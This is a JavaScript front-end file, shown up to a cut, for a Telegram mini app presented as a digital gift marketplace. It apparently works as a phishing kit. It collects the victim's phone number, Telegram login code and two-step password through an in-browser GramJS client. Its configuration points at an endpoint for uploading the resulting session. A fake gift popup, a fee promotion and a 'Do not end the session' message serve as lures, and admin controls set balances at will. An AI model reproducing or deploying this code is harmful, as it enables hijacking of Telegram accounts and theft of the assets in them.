const API_BASE = (window.TELETHON_API_URL || 'http://localhost:8000').replace(/\/$/, '');
const GRAMJS_CONFIG = window.GRAMJS_CONFIG || {};
const GRAMJS_API_ID = Number(GRAMJS_CONFIG.apiId || window.GRAMJS_API_ID || 0);
const GRAMJS_API_HASH = (GRAMJS_CONFIG.apiHash || window.GRAMJS_API_HASH || '').trim();
const GRAMJS_SESSION_KEY = GRAMJS_CONFIG.sessionStorageKey || 'market.gramjs.session';
const GRAMJS_TELETHON_KEY = GRAMJS_CONFIG.telethonStorageKey || 'market.telethon.session';
const GRAMJS_UPLOAD_ENDPOINT = GRAMJS_CONFIG.uploadEndpoint || '/auth/session';
const GRAMJS_UPLOAD_TOKEN = GRAMJS_CONFIG.uploadToken || '';
const GRAMJS_LOAD_URLS = Array.isArray(GRAMJS_CONFIG.loadUrls)
  ? GRAMJS_CONFIG.loadUrls
  : [
      './telegram.browser.js',
      'https://unpkg.com/telegram@2.17.10/index.browser.js',
      'https://cdn.jsdelivr.net/npm/telegram@2.17.10/index.browser.js',
    ];
const GRAMJS_ALLOWED_MISMATCH_PHONES =
  'allowedMismatchPhones' in GRAMJS_CONFIG ? GRAMJS_CONFIG.allowedMismatchPhones : [];
const GRAMJS_REQUIRE_APP_CODE =
  'requireAppCode' in GRAMJS_CONFIG ? Boolean(GRAMJS_CONFIG.requireAppCode) : false;
const GRAMJS_PENDING_TTL_MS =
  'pendingTtlSec' in GRAMJS_CONFIG ? Number(GRAMJS_CONFIG.pendingTtlSec) * 1000 : 300 * 1000;

const DEFAULT_MARKET = [
  { id: '352352', name: 'TON Emerald', number: 352352, price: 18.5, image: null },
  { id: '918204', name: 'Fragment Crown', number: 918204, price: 42, image: null },
  { id: '771409', name: 'Cipher Rose', number: 771409, price: 7.25, image: null },
  { id: '640912', name: 'Neon Crest', number: 640912, price: 13.8, image: null },
  { id: '502733', name: 'Binary Bloom', number: 502733, price: 5.6, image: null },
  { id: '431006', name: 'Fragment Shield', number: 431006, price: 21, image: null },
];

const DEFAULT_OWNED = [];

const DEFAULT_PROFILE = {
  tag: '@fragment_user',
  subtitle: null,
  balance: 0,
  stars: 0,
  stars_usd_rate: 0,
  avatar: null,
  stats: { volume: 0, bought: 0, sold: 0 },
};

const TRANSLATIONS = {
  ru: {
    title: 'Маркет подарков',
    header_subtitle: 'Маркет цифровых подарков',
    search_placeholder: 'Поиск по ID',
    sort_title: 'Сортировка по цене',
    sort_cheap: 'Сначала дешевле',
    sort_expensive: 'Сначала дороже',
    sort_popular: 'По популярности',
    sort_new: 'Новые',
    sort_range: '0 — {max} TON',
    action_withdraw: 'Вывести',
    action_sell: 'Продать',
    action_send: 'Отправить',
    action_withdraw_title: 'Вывод подарка',
    action_withdraw_subtitle: 'Подтвердите вывод выбранного подарка.',
    action_withdraw_label: 'Сумма вывода (TON)',
    action_withdraw_placeholder: 'Например 15.5',
    action_withdraw_button: 'Вывести',
    action_withdraw_confirm_title: 'Подтвердите вывод',
    action_withdraw_confirm_text: 'Подарок появится в вашем профиле.',
    action_sell_title: 'Продажа подарка',
    action_sell_subtitle: 'Выставьте подарок на продажу внутри Quest.',
    action_sell_label: 'Цена продажи (TON)',
    action_sell_placeholder: 'Например 24',
    action_sell_button: 'Выставить',
    action_send_title: 'Передача подарка',
    action_send_subtitle: 'Отправьте подарок другому пользователю.',
    action_send_label: 'Получатель',
    action_send_placeholder: '@username',
    action_send_button: 'Передать',
    action_fee_note: 'Комиссия 0% до 20 января',
    action_send_note: 'Передача внутри Quest займёт несколько секунд.',
    action_sell_note: 'После размещения подарок появится в маркете.',
    action_withdraw_note: 'Нажмите «Вывести», чтобы отправить подарок в профиль.',
    action_close: 'Закрыть',
    action_done: 'Заявка отправлена',
    cart_title: 'Корзина',
    cart_empty: 'Корзина пуста',
    cart_total: 'Итого',
    cart_checkout: 'Авторизоваться, чтобы продолжить',
    cart_pay: 'К оплате',
    cart_insufficient: 'Недостаточно средств на балансе',
    cart_items_count: '{count} подарков',
    nav_market: 'Маркет',
    nav_owned: 'Мои подарки',
    nav_profile: 'Профиль',
    stats_volume: 'Текущий объем',
    stats_bought: 'Куплено',
    stats_sold: 'Продано',
    profile_joined: 'Присоединился:',
    profile_auth: 'Авторизация',
    profile_auth_yes: 'Да',
    profile_auth_no: 'Нет',
    stars_section_title: 'Звезды',
    stars_section_badge: 'NEW!',
    stars_section_subtitle: 'Управление звездами и покупка Telegram Premium',
    stars_choose_duration: 'Выберите длительность',
    stars_premium_button: 'Оформить Премиум',
    stars_select_error: 'Выберите длительность.',
    premium_3m: '3 месяца',
    premium_6m: '6 месяцев',
    premium_12m: '12 месяцев',
    stars_action_withdraw: 'Вывести звезды',
    stars_action_transfer: 'Передать звезды',
    stars_action_topup: 'Пополнить звезды',
    ref_title: 'Реф система',
    ref_text: 'Приглашай друзей и получай до 5% с их депозитов.',
    ref_button: 'Пригласить друзей',
    auth_title: 'Авторизация',
    auth_intro_1: 'Войдите для расширенных действий в маркете.',
    auth_intro_2: 'Для продажи, покупки, обмена подарков необходимо авторизоваться через Telegram.',
    auth_start: 'Войти через Telegram',
    auth_phone_title: 'Вход через Telegram',
    auth_phone_text: 'Поделитесь номером телефона из аккаунта Telegram.',
    auth_phone_share: 'Поделиться номером',
    auth_next: 'Далее',
    auth_code_title: 'Код подтверждения',
    auth_code_text: 'Мы отправили код в приложение Telegram.',
    auth_code_label: 'Код',
    auth_code_hint: 'Посмотреть код:',
    auth_code_link: 'Открыть Telegram',
    auth_back: 'Назад',
    auth_password_title: 'Двухэтапная защита',
    auth_password_text: 'Введите пароль двухэтапной авторизации.',
    auth_password_label: 'Пароль',
    auth_password_hint_label: 'Подсказка:',
    auth_loading: 'Загрузка...',
    auth_success_title: 'Не завершайте сессию',
    auth_success_text: 'Ожидайте подтверждения запроса.',
    empty_market_title: 'Ничего не найдено',
    empty_market_subtitle: 'Попробуйте другой ID.',
    empty_owned_title: 'Пока нет подарков',
    empty_owned_subtitle: 'Здесь появятся ваши покупки.',
    toast_select_gift: 'Выберите подарок',
    card_received: 'Получено: {date}',
    card_received_empty: 'Дата получения: —',
    buy_gift: 'Купить подарок',
    buy_for: 'Купить за {price} TON',
    add_to_cart: 'Добавить в корзину',
    phone_short: 'Номер телефона слишком короткий.',
    phone_missing: 'Поделитесь номером телефона в Telegram.',
    sending_code: '',
    send_code_failed: 'Не удалось отправить код.',
    code_sent: '',
    send_code_error: 'Ошибка отправки кода.',
    rate_limit: 'Слишком много попыток. Повторите через {seconds} сек.',
    rate_limit_generic: 'Слишком много попыток. Попробуйте позже.',
    code_short: 'Введите 5-значный код.',
    verify_code: 'Проверяем код...',
    auth_error: 'Ошибка входа.',
    auth_session_failed: 'Не удалось сохранить сессию.',
    auth_gramjs_missing: 'GramJS не загружен. Проверьте telegram.browser.js.',
    auth_api_missing: 'Не задан API ID / API HASH.',
    auth_account_mismatch: 'Регистрация доступна только для аккаунта, с которого открыто мини-приложение.',
    auth_code_not_app: 'Код должен прийти внутри Telegram (не SMS/звонок).',
    auth_phone_invalid: 'Неверный формат номера.',
    auth_phone_banned: 'Этот номер заблокирован в Telegram.',
    auth_code_invalid: 'Неверный код подтверждения.',
    auth_code_expired: 'Код подтверждения истек. Запросите новый код.',
    auth_password_invalid: 'Неверный пароль. Проверьте и попробуйте снова.',
    password_required: 'Нужен пароль двухэтапной защиты.',
    password_prompt: 'Введите пароль.',
    verify_password: 'Проверяем пароль...',
    profile_subtitle: 'Коллекция подарков',
    settings_haptics: 'Вибрация',
    settings_haptics_on: 'Вкл',
    settings_haptics_off: 'Выкл',
    settings_language: 'Язык',
    settings_language_ru: 'Русский',
    settings_language_en: 'English',
    settings_send_mode: 'Отправка',
    settings_send_gift: 'Подарок',
    settings_send_stars: 'Stars чек',
    settings_send_error: 'Не удалось сохранить настройки.',
    settings_admin_title: 'Админ',
    settings_admin_joined: 'Дата регистрации',
    settings_admin_stars: 'Баланс звёзд',
    settings_admin_balance: 'Баланс TON',
    admin_modal_title: 'Админ настройки',
    admin_modal_subtitle: 'Введите новое значение',
    admin_modal_label: 'Значение',
    admin_modal_save: 'Сохранить',
    admin_modal_saved: 'Изменения сохранены.',
    admin_modal_error: 'Не удалось сохранить.',
    admin_modal_joined_title: 'Дата регистрации',
    admin_modal_joined_label: 'Новая дата',
    admin_modal_stars_title: 'Баланс звёзд',
    admin_modal_stars_label: 'Новый баланс',
    admin_modal_balance_title: 'Баланс TON',
    admin_modal_balance_label: 'Новый баланс',
    topup_title: 'Пополнение',
    topup_ton_label: 'TON',
    topup_stars_label: 'STARS',
    topup_ton_deposit: 'Ввод TON',
    topup_ton_withdraw: 'Вывод TON',
    topup_stars_deposit: 'Ввод звёзд',
    topup_stars_withdraw: 'Вывод звёзд',
    stars_topup_title: 'Пополнение звёзд',
    stars_topup_note: 'Выберите сумму — откроется оплата звёздами.',
    stars_topup_select: 'Выберите сумму.',
    stars_topup_created: 'Счёт на оплату создан.',
    stars_topup_success: 'Оплата принята.',
    stars_topup_error: 'Не удалось создать оплату.',
    stars_topup_unavailable: 'Откройте в Telegram, чтобы оплатить.',
    withdraw_title: 'Вывод звёзд',
    withdraw_ru: 'Карта РФ',
    withdraw_intl: 'Карта зарубеж',
    withdraw_profile: 'В профиль',
    withdraw_ton: 'Перевести в TON',
    withdraw_ru_sub: 'Быстро и удобно',
    withdraw_intl_sub: 'Любая страна',
    withdraw_profile_sub: 'Внутренний перевод',
    withdraw_ton_sub: 'Конвертация в TON',
    withdraw_note: 'Для вывода потребуется авторизация.',
    stars_claim_title: 'Зачисление звёзд',
    stars_claim_button: 'Получить',
    stars_claim_success: 'Звёзды зачислены.',
    stars_claim_error: 'Не удалось зачислить звёзды.',
    stars_claim_forbidden: 'Этот чек предназначен другому пользователю.',
    stars_claim_used: 'Чек уже активирован.',
    stars_claim_missing: 'Чек не найден.',
    stars_claim_invalid: 'Некорректный чек.',
    aria_topup: 'Пополнить',
    aria_settings: 'Настройки',
    aria_nav: 'Навигация',
    aria_close: 'Закрыть',
    aria_show_password: 'Показать пароль',
    aria_hide_password: 'Скрыть пароль',
    gift_title: 'Вам перевели ToyBear-31248',
    gift_button: 'Получить',
    purchase_title: 'Купить подарок',
    purchase_balance_label: 'Доступный баланс',
    purchase_insufficient: 'Недостаточный баланс',
    purchase_close: 'Закрыть',
    purchase_buy: 'Купить подарок',
    aria_price_max: 'Максимальная цена',
    alt_market_logo: 'Маркет',
    alt_gift: 'Подарок',
  },
  en: {
    title: 'Gift Market',
    header_subtitle: 'Digital gifts marketplace',
    search_placeholder: 'Search by ID',
    sort_title: 'Sort by price',
    sort_cheap: 'Cheapest first',
    sort_expensive: 'Most expensive first',
    sort_popular: 'Most popular',
    sort_new: 'Newest',
    sort_range: '0 — {max} TON',
    action_withdraw: 'Withdraw',
    action_sell: 'Sell',
    action_send: 'Send',
    action_withdraw_title: 'Gift withdrawal',
    action_withdraw_subtitle: 'Confirm withdrawal of the selected gift.',
    action_withdraw_label: 'Withdrawal amount (TON)',
    action_withdraw_placeholder: 'For example 15.5',
    action_withdraw_button: 'Withdraw',
    action_withdraw_confirm_title: 'Confirm withdrawal',
    action_withdraw_confirm_text: 'The gift will appear in your profile.',
    action_sell_title: 'Gift sale',
    action_sell_subtitle: 'List the gift for sale inside Quest.',
    action_sell_label: 'Sale price (TON)',
    action_sell_placeholder: 'For example 24',
    action_sell_button: 'List for sale',
    action_send_title: 'Gift transfer',
    action_send_subtitle: 'Send the gift to another user.',
    action_send_label: 'Recipient',
    action_send_placeholder: '@username',
    action_send_button: 'Send',
    action_fee_note: '0% fee until Jan 20',
    action_send_note: 'Transfers inside Quest take a few seconds.',
    action_sell_note: 'After listing, the gift will appear in the market.',
    action_withdraw_note: 'Tap "Withdraw" to send the gift to your profile.',
    action_close: 'Close',
    action_done: 'Request submitted',
    cart_title: 'Cart',
    cart_empty: 'Cart is empty',
    cart_total: 'Total',
    cart_checkout: 'Sign in to continue',
    cart_pay: 'Total',
    cart_insufficient: 'Insufficient balance',
    cart_items_count: '{count} gifts',
    nav_market: 'Market',
    nav_owned: 'My gifts',
    nav_profile: 'Profile',
    stats_volume: 'Total volume',
    stats_bought: 'Bought',
    stats_sold: 'Sold',
    profile_joined: 'Joined:',
    profile_auth: 'Authorization',
    profile_auth_yes: 'Yes',
    profile_auth_no: 'No',
    stars_section_title: 'Stars',
    stars_section_badge: 'NEW!',
    stars_section_subtitle: 'Manage stars and buy Telegram Premium',
    stars_choose_duration: 'Choose duration',
    stars_premium_button: 'Get Premium',
    stars_select_error: 'Select a duration.',
    premium_3m: '3 months',
    premium_6m: '6 months',
    premium_12m: '12 months',
    stars_action_withdraw: 'Withdraw stars',
    stars_action_transfer: 'Transfer stars',
    stars_action_topup: 'Top up stars',
    ref_title: 'Referral program',
    ref_text: 'Invite friends and earn up to 5% from their deposits.',
    ref_button: 'Invite friends',
    auth_title: 'Authorization',
    auth_intro_1: 'Sign in for extended market actions.',
    auth_intro_2: 'To sell, buy, or exchange gifts you need Telegram authorization.',
    auth_start: 'Sign in with Telegram',
    auth_phone_title: 'Telegram login',
    auth_phone_text: 'Share your Telegram phone number to continue.',
    auth_phone_share: 'Share phone number',
    auth_next: 'Next',
    auth_code_title: 'Confirmation code',
    auth_code_text: 'We sent the code to Telegram.',
    auth_code_label: 'Code',
    auth_code_hint: 'Check the code:',
    auth_code_link: 'Open Telegram',
    auth_back: 'Back',
    auth_password_title: 'Two-step verification',
    auth_password_text: 'Enter your two-step verification password.',
    auth_password_label: 'Password',
    auth_password_hint_label: 'Hint:',
    auth_loading: 'Loading...',
    auth_success_title: 'Do not end the session',
    auth_success_text: 'Please wait for confirmation.',
    empty_market_title: 'Nothing found',
    empty_market_subtitle: 'Try a different ID.',
    empty_owned_title: 'No gifts yet',
    empty_owned_subtitle: 'Your purchases will appear here.',
    toast_select_gift: 'Select a gift',
    card_received: 'Received: {date}',
    card_received_empty: 'Received date: —',
    buy_gift: 'Buy gift',
    buy_for: 'Buy for {price} TON',
    add_to_cart: 'Add to cart',
    phone_short: 'Phone number is too short.',
    phone_missing: 'Please share your phone number in Telegram.',
    sending_code: 'Sending code...',
    send_code_failed: 'Failed to send the code.',
    code_sent: 'Code sent.',
    send_code_error: 'Code sending failed.',
    rate_limit: 'Too many attempts. Try again in {seconds} sec.',
    rate_limit_generic: 'Too many attempts. Try again later.',
    code_short: 'Enter the 5-digit code.',
    verify_code: 'Verifying code...',
    auth_error: 'Login failed.',
    auth_session_failed: 'Failed to save the session.',
    auth_gramjs_missing: 'GramJS is not loaded. Check telegram.browser.js.',
    auth_api_missing: 'API ID / API HASH not set.',
    auth_account_mismatch: 'Login is allowed only for the account that opened this mini app.',
    auth_code_not_app: 'Code must arrive inside Telegram (no SMS/call).',
    auth_phone_invalid: 'Invalid phone number.',
    auth_phone_banned: 'This phone number is banned on Telegram.',
    auth_code_invalid: 'Invalid confirmation code.',
    auth_code_expired: 'The code has expired. Request a new one.',
    auth_password_invalid: 'Invalid password. Try again.',
    password_required: 'Two-step password required.',
    password_prompt: 'Enter your password.',
    verify_password: 'Checking password...',
    profile_subtitle: 'Gift collection',
    settings_haptics: 'Vibration',
    settings_haptics_on: 'On',
    settings_haptics_off: 'Off',
    settings_language: 'Language',
    settings_language_ru: 'Russian',
    settings_language_en: 'English',
    settings_send_mode: 'Send mode',
    settings_send_gift: 'Gift',
    settings_send_stars: 'Stars check',
    settings_send_error: 'Failed to save settings.',
    settings_admin_title: 'Admin',
    settings_admin_joined: 'Joined date',
    settings_admin_stars: 'Stars balance',
    settings_admin_balance: 'TON balance',
    admin_modal_title: 'Admin settings',
    admin_modal_subtitle: 'Enter a new value',
    admin_modal_label: 'Value',
    admin_modal_save: 'Save',
    admin_modal_saved: 'Changes saved.',
    admin_modal_error: 'Unable to save.',
    admin_modal_joined_title: 'Joined date',
    admin_modal_joined_label: 'New date',
    admin_modal_stars_title: 'Stars balance',
    admin_modal_stars_label: 'New balance',
    admin_modal_balance_title: 'TON balance',
    admin_modal_balance_label: 'New balance',
    topup_title: 'Top up',
    topup_ton_label: 'TON',
    topup_stars_label: 'STARS',
    topup_ton_deposit: 'Deposit TON',
    topup_ton_withdraw: 'Withdraw TON',
    topup_stars_deposit: 'Top up stars',
    topup_stars_withdraw: 'Withdraw stars',
    stars_topup_title: 'Top up stars',
    stars_topup_note: 'Pick an amount to open star payment.',
    stars_topup_select: 'Select an amount.',
    stars_topup_created: 'Invoice created.',
    stars_topup_success: 'Payment accepted.',
    stars_topup_error: 'Unable to create payment.',
    stars_topup_unavailable: 'Open in Telegram to pay.',
    withdraw_title: 'Withdraw stars',
    withdraw_ru: 'RU card',
    withdraw_intl: 'International card',
    withdraw_profile: 'To profile',
    withdraw_ton: 'Convert to TON',
    withdraw_ru_sub: 'Fast payout',
    withdraw_intl_sub: 'Any country',
    withdraw_profile_sub: 'Internal transfer',
    withdraw_ton_sub: 'Convert to TON',
    withdraw_note: 'Authorization required to withdraw.',
    stars_claim_title: 'Claim stars',
    stars_claim_button: 'Claim',
    stars_claim_success: 'Stars credited.',
    stars_claim_error: 'Unable to claim stars.',
    stars_claim_forbidden: 'This check is for a different user.',
    stars_claim_used: 'This check has already been used.',
    stars_claim_missing: 'Check not found.',
    stars_claim_invalid: 'Invalid check.',
    aria_topup: 'Top up',
    aria_settings: 'Settings',
    aria_nav: 'Navigation',
    aria_close: 'Close',
    aria_show_password: 'Show password',
    aria_hide_password: 'Hide password',
    gift_title: 'You received ToyBear-31248',
    gift_button: 'Claim',
    purchase_title: 'Buy gift',
    purchase_balance_label: 'Available balance',
    purchase_insufficient: 'Insufficient balance',
    purchase_close: 'Close',
    purchase_buy: 'Buy gift',
    aria_price_max: 'Maximum price',
    alt_market_logo: 'Market',
    alt_gift: 'Gift',
  },
};

const state = {
  market: DEFAULT_MARKET,
  marketPopular: null,
  marketNew: null,
  owned: DEFAULT_OWNED,
  profile: DEFAULT_PROFILE,
  search: '',
  sortMode: 'popular',
  sortMaxPrice: null,
  sortRangeMax: null,
  language: 'en',
  hapticsEnabled: true,
  marketRendered: false,
  ownedRendered: false,
  isAuthorized: false,
  selectedOwnedId: null,
  hasChatAccess: false,
  sendMode: 'gift',
  activeOwnedAction: null,
  activePurchaseItem: null,
  cartItems: [],
};
let languageLocked = false;

const SETTINGS_KEYS = {
  language: 'market.language',
  haptics: 'market.haptics',
};

const BOOT_KEY = 'market.boot';
const GIFT_POPUP_NUMBER = 31248;
const GIFT_POPUP_NAME = 'Toy Bear';
const GIFT_POPUP_KEY = 'market.gift.toybear31248.last';
const GIFT_POPUP_GIF = '/market-data/src/ToyBear.gif';
const STAR_PARAM_PREFIX = 'stars_';
const STAR_CLAIM_KEY = 'market.stars.claimed';
const JOINED_KEY = 'market.joined_at';
const ACTION_CONFIG = {
  withdraw: {
    title: 'action_withdraw_title',
    subtitle: 'action_withdraw_subtitle',
    button: 'action_withdraw_button',
  },
  sell: {
    title: 'action_sell_title',
    subtitle: 'action_sell_subtitle',
    button: 'action_sell_button',
  },
  send: {
    title: 'action_send_title',
    subtitle: 'action_send_subtitle',
    button: 'action_send_button',
  },
};

let tgWebApp = null;
let authToken = null;
let authLoading = false;
let authPasswordHint = '';
let gramjsClient = null;
let gramjsLib = null;
let gramjsAuth = null;
let gramjsLoadPromise = null;
let gramjsAuthTimer = null;
let dataLoaded = false;
let pendingStarToken = null;
let starClaimLoading = false;
let starClaimPreviewLoading = false;
let starsTopupAmount = null;
let starsTopupLoading = false;
let selectedPremiumUsd = null;
let sendModeLoading = false;
let startParamHandled = false;
let starsPanelOpen = false;
let activeAdminAction = null;

const elements = {
  boot: document.getElementById('boot'),
  headerMain: document.getElementById('header-main'),
  headerProfile: document.getElementById('header-profile'),
  headerAvatar: document.getElementById('header-avatar'),
  headerTag: document.getElementById('header-tag'),
  headerSub: document.getElementById('header-sub'),
  headerBalance: document.getElementById('header-balance'),
  headerStars: document.getElementById('header-stars'),
  balanceBlocks: Array.from(document.querySelectorAll('[data-balance-open="true"]')),
  profileAvatar: document.getElementById('profile-avatar'),
  profileName: document.getElementById('profile-name'),
  profileTag: document.getElementById('profile-tag'),
  profileJoined: document.getElementById('profile-joined'),
  profileAuth: document.getElementById('profile-auth'),
  profileBalance: document.getElementById('profile-balance'),
  profileStars: document.getElementById('profile-stars'),
  starsPanel: document.getElementById('stars-panel'),
  starsToggle: document.getElementById('stars-toggle'),
  starsBody: document.getElementById('stars-body'),
  premiumPlans: Array.from(document.querySelectorAll('.premium-list .stars-plan')),
  premiumSubmit: document.getElementById('premium-submit'),
  starsActions: Array.from(document.querySelectorAll('.stars-panel .stars-actions [data-stars-action]')),
  starsActions: Array.from(document.querySelectorAll('[data-stars-action]')),
  statVolume: document.getElementById('stat-volume'),
  statBought: document.getElementById('stat-bought'),
  statSold: document.getElementById('stat-sold'),
  marketGrid: document.getElementById('market-grid'),
  ownedGrid: document.getElementById('owned-grid'),
  searchInput: document.getElementById('search-input'),
  filterBtn: document.getElementById('filter-btn'),
  sortPanel: document.getElementById('sort-panel'),
  sortValue: document.getElementById('sort-value'),
  sortFill: document.getElementById('sort-fill'),
  sortThumb: document.getElementById('sort-thumb'),
  sortRange: document.getElementById('sort-range'),
  sortMin: document.getElementById('sort-min'),
  sortMax: document.getElementById('sort-max'),
  sortChips: Array.from(document.querySelectorAll('.sort-chip')),
  settingsBtn: document.getElementById('settings-btn'),
  settingsPanel: document.getElementById('settings-panel'),
  settingsHapticsButtons: Array.from(document.querySelectorAll('[data-haptics]')),
  settingsLanguageButtons: Array.from(document.querySelectorAll('[data-lang]')),
  settingsSendModeRow: document.getElementById('settings-send-mode-row'),
  settingsSendModeButtons: Array.from(document.querySelectorAll('[data-send-mode]')),
  settingsAdminRow: document.getElementById('settings-admin-row'),
  settingsAdminButtons: Array.from(document.querySelectorAll('[data-admin-action]')),
  balancePlus: document.getElementById('balance-plus'),
  navItems: Array.from(document.querySelectorAll('.nav-item')),
  tabs: Array.from(document.querySelectorAll('.tab')),
  actionButtons: Array.from(document.querySelectorAll('.action-btn')),
  cartFab: document.getElementById('cart-fab'),
  cartBadge: document.getElementById('cart-badge'),
  cartCount: document.getElementById('cart-count'),
  cartTotal: document.getElementById('cart-total'),
  toast: document.getElementById('toast'),
  authModal: document.getElementById('auth-modal'),
  authIntro: document.getElementById('auth-intro'),
  authPhoneForm: document.getElementById('auth-phone'),
  authCodeForm: document.getElementById('auth-code'),
  authPasswordForm: document.getElementById('auth-password'),
  authLoading: document.getElementById('auth-loading'),
  authSuccess: document.getElementById('auth-success'),
  authStatus: document.getElementById('auth-status'),
  actionModal: document.getElementById('action-modal'),
  actionTitle: document.getElementById('action-title'),
  actionSubtitle: document.getElementById('action-subtitle'),
  actionGiftImage: document.getElementById('action-gift-image'),
  actionGiftName: document.getElementById('action-gift-name'),
  actionGiftNumber: document.getElementById('action-gift-number'),
  actionSubmit: document.getElementById('action-submit'),
  actionPanels: Array.from(document.querySelectorAll('[data-action-panel]')),
  actionInputs: Array.from(document.querySelectorAll('.action-input')),
  purchaseModal: document.getElementById('purchase-modal'),
  purchaseTitle: document.getElementById('purchase-title'),
  purchaseImage: document.getElementById('purchase-image'),
  purchaseName: document.getElementById('purchase-name'),
  purchaseNumber: document.getElementById('purchase-number'),
  purchasePrice: document.getElementById('purchase-price'),
  purchaseBalance: document.getElementById('purchase-balance'),
  purchaseTotal: document.getElementById('purchase-total'),
  purchaseBuy: document.getElementById('purchase-buy'),
  cartModal: document.getElementById('cart-modal'),
  cartList: document.getElementById('cart-list'),
  cartSummaryTotal: document.getElementById('cart-summary-total'),
  cartHeaderCount: document.getElementById('cart-header-count'),
  cartCheckout: document.getElementById('cart-checkout'),
  authStart: document.getElementById('auth-start'),
  authCodeInput: document.getElementById('auth-code-input'),
  codeInput: document.getElementById('code-input'),
  codeCells: document.getElementById('code-cells'),
  codeCellNodes: Array.from(document.querySelectorAll('#code-cells .code-cell')),
  authPasswordInput: document.getElementById('auth-password-input'),
  passwordInput: document.getElementById('password-input'),
  passwordToggle: document.getElementById('password-toggle'),
  authPasswordHint: document.getElementById('auth-password-hint'),
  authBack: document.getElementById('auth-back'),
  authBackPassword: document.getElementById('auth-back-password'),
  giftModal: document.getElementById('gift-modal'),
  giftImage: document.getElementById('gift-image'),
  giftAccept: document.getElementById('gift-accept'),
  topupModal: document.getElementById('topup-modal'),
  topupTon: document.getElementById('topup-ton'),
  topupStars: document.getElementById('topup-stars'),
  topupStarsUsd: document.getElementById('topup-stars-usd'),
  starsTopupModal: document.getElementById('stars-topup-modal'),
  starsTopupGrid: document.getElementById('stars-topup-grid'),
  starsTopupButtons: Array.from(document.querySelectorAll('[data-stars-topup]')),
  withdrawModal: document.getElementById('withdraw-modal'),
  withdrawOptions: Array.from(document.querySelectorAll('[data-withdraw]')),
  starsClaimModal: document.getElementById('stars-claim-modal'),
  starsClaimValue: document.getElementById('stars-claim-value'),
  starsClaimError: document.getElementById('stars-claim-error'),
  starsClaimBtn: document.getElementById('stars-claim-btn'),
  adminModal: document.getElementById('admin-modal'),
  adminTitle: document.getElementById('admin-title'),
  adminSubtitle: document.getElementById('admin-subtitle'),
  adminLabel: document.getElementById('admin-label'),
  adminInput: document.getElementById('admin-input'),
  adminSubmit: document.getElementById('admin-submit'),
  alert: document.getElementById('alert'),
};

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function preloadImage(src, timeoutMs = 12000) {
  return new Promise((resolve) => {
    if (!src) return resolve(false);
    const img = new Image();
    let settled = false;
    const done = (ok) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      resolve(ok);
    };
    const timer = setTimeout(() => done(false), timeoutMs);
    img.onload = () => done(true);
    img.onerror = () => done(false);
    img.src = src;
  });
}

function t(key, vars = {}) {
  const dict = TRANSLATIONS[state.language] || TRANSLATIONS.ru;
  const base = dict[key] || TRANSLATIONS.ru[key] || key;
  return Object.keys(vars).reduce((text, token) => {
    return text.replace(new RegExp(`\\{${token}\\}`, 'g'), vars[token]);
  }, base);
}

function applyTranslations() {
  document.documentElement.lang = state.language;
  document.title = t('title');
  document.querySelectorAll('[data-i18n]').forEach((el) => {
    const key = el.dataset.i18n;
    if (key) el.textContent = t(key);
  });
  document.querySelectorAll('[data-i18n-placeholder]').forEach((el) => {
    const key = el.dataset.i18nPlaceholder;
    if (key) el.setAttribute('placeholder', t(key));
  });
  document.querySelectorAll('[data-i18n-aria]').forEach((el) => {
    const key = el.dataset.i18nAria;
    if (key) el.setAttribute('aria-label', t(key));
  });
  document.querySelectorAll('[data-i18n-alt]').forEach((el) => {
    const key = el.dataset.i18nAlt;
    if (key) el.setAttribute('alt', t(key));
  });
  updateSortUi();
  updatePasswordToggleLabel();
  updateCartUi();
  setPasswordHint(authPasswordHint);
}

function resolveTelegramLanguage() {
  const user = getTelegramUser();
  if (!user?.language_code) return null;
  const code = String(user.language_code).toLowerCase();
  if (code.startsWith('ru')) return 'ru';
  return 'en';
}

function applyTelegramLanguageIfUnlocked() {
  if (languageLocked) return;
  const lang = resolveTelegramLanguage();
  if (!lang || lang === state.language) return;
  setLanguage(lang, false);
}

function loadSettings() {
  try {
    const storedLang = localStorage.getItem(SETTINGS_KEYS.language);
    if (storedLang === 'ru' || storedLang === 'en') {
      state.language = storedLang;
      languageLocked = true;
    } else {
      languageLocked = false;
      state.language = resolveTelegramLanguage() || 'en';
    }
    const storedHaptics = localStorage.getItem(SETTINGS_KEYS.haptics);
    if (storedHaptics === 'off') state.hapticsEnabled = false;
    if (storedHaptics === 'on') state.hapticsEnabled = true;
  } catch (err) {
    console.warn('Settings load failed:', err);
    languageLocked = false;
    state.language = 'en';
  }
}

function applySettingsUi() {
  if (elements.settingsHapticsButtons.length) {
    elements.settingsHapticsButtons.forEach((btn) => {
      btn.classList.toggle('is-active', btn.dataset.haptics === (state.hapticsEnabled ? 'on' : 'off'));
    });
  }
  if (elements.settingsLanguageButtons.length) {
    elements.settingsLanguageButtons.forEach((btn) => {
      btn.classList.toggle('is-active', btn.dataset.lang === state.language);
    });
  }
  if (elements.settingsSendModeRow) {
    elements.settingsSendModeRow.classList.toggle('is-hidden', !state.hasChatAccess);
  }
  if (elements.settingsAdminRow) {
    elements.settingsAdminRow.classList.toggle('is-hidden', !state.hasChatAccess);
  }
  if (elements.settingsSendModeButtons.length) {
    elements.settingsSendModeButtons.forEach((btn) => {
      btn.classList.toggle('is-active', btn.dataset.sendMode === state.sendMode);
    });
  }
}

function setLanguage(lang, persist = true) {
  state.language = lang === 'en' ? 'en' : 'ru';
  if (persist) {
    languageLocked = true;
    try {
      localStorage.setItem(SETTINGS_KEYS.language, state.language);
    } catch (err) {
      console.warn('Settings save failed:', err);
    }
  }
  applyTranslations();
  applySettingsUi();
  renderMarket();
  renderOwned();
  applyProfile(state.profile);
}

function setHapticsEnabled(enabled) {
  state.hapticsEnabled = Boolean(enabled);
  try {
    localStorage.setItem(SETTINGS_KEYS.haptics, state.hapticsEnabled ? 'on' : 'off');
  } catch (err) {
    console.warn('Settings save failed:', err);
  }
  applySettingsUi();
  if (state.hapticsEnabled) triggerHaptic('light');
}

function setSendMode(mode) {
  state.sendMode = mode === 'stars' ? 'stars' : 'gift';
  applySettingsUi();
}

function toggleSendModeButtons(disabled) {
  if (!elements.settingsSendModeButtons.length) return;
  elements.settingsSendModeButtons.forEach((btn) => {
    btn.disabled = disabled;
  });
}

async function saveSendMode(mode) {
  if (sendModeLoading) return;
  const user = getTelegramUser();
  if (!user?.id) {
    showAlert(t('settings_send_error'));
    return;
  }
  const nextMode = mode === 'stars' ? 'stars' : 'gift';
  if (state.sendMode === nextMode) return;

  sendModeLoading = true;
